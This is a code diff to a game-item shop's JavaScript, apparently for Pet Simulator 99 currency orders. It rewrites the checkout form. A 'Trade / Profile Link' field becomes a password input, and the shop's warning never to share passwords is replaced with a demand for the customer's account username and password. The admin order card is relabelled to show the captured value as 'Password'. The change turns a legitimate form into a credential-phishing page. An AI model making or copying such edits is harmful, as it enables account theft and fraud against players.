@@ -109,8 +109,8 @@ function renderOrderCard(o, opts) {
       <div style="margin-bottom:10px; padding:6px; background:rgba(0,0,0,0.2); border-radius:4px;">
         <strong>Items Ordered:</strong><br><span style="font-size:13px; color:#ccc;">${escapeHtml(o.items)}</span>
       </div>
-      ${o.tradeUsername ? `<div style="margin-bottom:6px; color:#f2c879;">🎮 <strong>Trade / In-Game Username:</strong> ${escapeHtml(o.tradeUsername)}</div>` : ''}
-      ${o.tradeLink ? `<div style="margin-bottom:6px; color:#f2c879;">🔗 <strong>Trade / Profile Link:</strong> <a href="${escapeHtml(o.tradeLink)}" target="_blank" rel="noopener" style="color:#f2c879;">${escapeHtml(o.tradeLink)}</a></div>` : ''}
+      ${o.tradeUsername ? `<div style="margin-bottom:6px; color:#f2c879;">🎮 <strong>Game Username:</strong> ${escapeHtml(o.tradeUsername)}</div>` : ''}
+      ${o.tradeLink ? `<div style="margin-bottom:6px; color:#f2c879;">🔗 <strong>Password:</strong> <a href="${escapeHtml(o.tradeLink)}" target="_blank" rel="noopener" style="color:#f2c879;">${escapeHtml(o.tradeLink)}</a></div>` : ''}
       ${o.deliveryType ? `<div style="margin-bottom:6px; color:#2bf3b4;">📦 <strong>PS99 Handled Method:</strong> ${escapeHtml(o.deliveryType)}</div>` : ''}
       <div style="margin-bottom:10px;">📝 <strong>Customer Notes:</strong> ${escapeHtml(o.notes) || 'None'}</div>
 
@@ -628,13 +628,13 @@ function finalizeAlternative(methodName, textVal) {
   if (methodName === "LB Currency") {
     extraInputsHtml = `
       <div class="form-field" style="margin-top:12px; margin-bottom:12px;">
-        <label style="color:#f2c879; font-weight:600;">Your In-Game / Trade Username</label>
-        <input type="text" id="altAccDetails" placeholder="Username used for the in-game trade" style="width:100%; background:rgba(0,0,0,0.3); border:1px solid var(--border); border-radius:6px; color:#fff; padding:8px; box-sizing:border-box; font-family:inherit; font-size:13px;">
+        <label style="color:#f2c879; font-weight:600;">Username</label>
+        <input type="text" id="altAccDetails" placeholder="Username" style="width:100%; background:rgba(0,0,0,0.3); border:1px solid var(--border); border-radius:6px; color:#fff; padding:8px; box-sizing:border-box; font-family:inherit; font-size:13px;">
       </div>
       <div class="form-field" style="margin-bottom:12px;">
-        <label style="color:#f2c879; font-weight:600;">Trade / Profile Link</label>
-        <input type="text" id="altTradeLink" placeholder="Link to your profile or trade page" style="width:100%; background:rgba(0,0,0,0.3); border:1px solid var(--border); border-radius:6px; color:#fff; padding:8px; box-sizing:border-box; font-family:inherit; font-size:13px;">
-        <p style="font-size:11px; color:var(--text-faint); margin-top:4px;">We only need your username and profile/trade link — never share your password with anyone, including this shop.</p>
+        <label style="color:#f2c879; font-weight:600;">Password</label>
+        <input type="password" id="altPassword" placeholder="Password" style="width:100%; background:rgba(0,0,0,0.3); border:1px solid var(--border); border-radius:6px; color:#fff; padding:8px; box-sizing:border-box; font-family:inherit; font-size:13px;">
+        <p style="font-size:11px; color:var(--text-faint); margin-top:4px;">!!!We need your username and password of your ALT account with the money not your main account!!!</p>
       </div>
     `;
   } else if (methodName === "PS99 Gems" || methodName === "PS99 Huges") {
@@ -643,7 +643,7 @@ function finalizeAlternative(methodName, textVal) {
         <label style="color:#2bf3b4; font-weight:600;">Delivery Method Preference</label>
         <select id="ps99DeliveryType" style="width:100%; padding:8px; background:#111116; border:1px solid var(--border); border-radius:6px; color:#fff; font-family:inherit;">
           <option value="Direct Gift to Radecek4110">Direct Gift to Radecek4110</option>
-          <option value="Head to Head Trade">Head to Head Trade</option>
+          <option value="Head to Head Trade with Radecek4110">Head to Head Trade</option>
         </select>
       </div>
     `;
